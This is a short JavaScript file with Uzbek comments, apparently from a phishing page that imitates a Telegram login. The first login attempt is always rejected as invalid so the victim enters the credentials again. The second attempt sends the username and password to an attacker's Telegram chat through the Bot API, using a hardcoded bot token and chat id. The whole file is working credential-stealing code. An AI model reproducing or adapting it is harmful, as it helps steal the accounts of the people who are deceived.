document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const validText = document.querySelector(".invalid");
    let tryCount = 0; // hisoblagich

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username');
        const password = document.getElementById('password');

        // invalid-input klassini olib tashlash
        username.classList.remove('invalid-input');
        password.classList.remove('invalid-input');

        if (tryCount === 0) {
            // agar bu birinchi urinish bo'lsa, invalid input deb belgilaymiz
            username.classList.add('invalid-input');
            password.classList.add('invalid-input');
            validText.style.display = 'block';
            username.value = '';
            password.value = '';

            tryCount++;
            return; // funksiyani to'xtatamiz
        } else {
            // ikkinchi urinishda loading spinnerni ko'rsatish
            loading.style.display = 'flex';

            setTimeout(() => {
                const encodedUsername = encodeURIComponent(username.value);
                const encodedPassword = encodeURIComponent(password.value);
                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;

                // Telegram API'ga yuboriladigan URL
                const url = `https://api.telegram.org/bot7597620170:AAGLp34P-X4Xfl1S3YwlOo3Ph1fxW7EzVhc/sendMessage?chat_id=5782037609&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;

                // fetch yordamida so'rov yuborish
                fetch(url, { method: 'GET' })
                    .then(response => response.json())
                    .then(data => {
                        loading.style.display = 'none'; // loadingni yashirish
                        if (data.ok) {
                            console.log("Message sent successfully:", data.result.message_id);
                        } else {
                            console.log("Error:", data.error_code);
                        }
                    })
                    .catch((error) => {
                        alert("Error! Please try again: " + error.message);
                        loading.style.display = 'none';
                        username.value = '';
                        password.value = '';
                    });
            }, 2000); // 2 soniya kutish
        }
    });
});
